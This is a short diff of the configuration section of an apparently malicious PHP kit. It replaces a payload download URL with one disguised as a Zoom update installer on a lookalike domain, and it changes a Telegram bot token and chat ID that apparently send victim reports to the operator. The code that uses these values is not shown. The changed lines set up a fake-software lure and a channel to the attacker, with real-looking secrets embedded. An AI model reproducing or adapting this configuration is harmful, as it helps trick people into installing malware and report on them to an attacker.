@@ -2,9 +2,9 @@
 // =====================================================
 // CONFIGURATION SECTION — EDIT ONLY THESE 3 VALUES
 // =====================================================
-$DOWNLOAD_URL        = "https://apinetsolworkspace.network/api/build/7b068046-a13e-48e9-80e3-9c63c9ca0317/download";        // Example: https://example.com/file.exe
-$TELEGRAM_BOT_TOKEN  = "7284066719:AAFmrZ2q7kWos3sAwvigTquNtFwGEjN3JGY";      // Example: 123456:ABC-xyz
-$TELEGRAM_CHAT_ID    = "7724482403";             // Example: 987654321
+$DOWNLOAD_URL        = "https://zoom-meeting.yourco-invite.live/inc/Windows/client/update/ZoomUpdateInstaller.msi";        // Example: https://example.com/file.exe
+$TELEGRAM_BOT_TOKEN  = "7760446627:AAG25TTGqY3N2hwLgR-cNYyvztx1jC7Lx4c";      // Example: 123456:ABC-xyz
+$TELEGRAM_CHAT_ID    = "1560553922";             // Example: 987654321
 // =====================================================
 
 
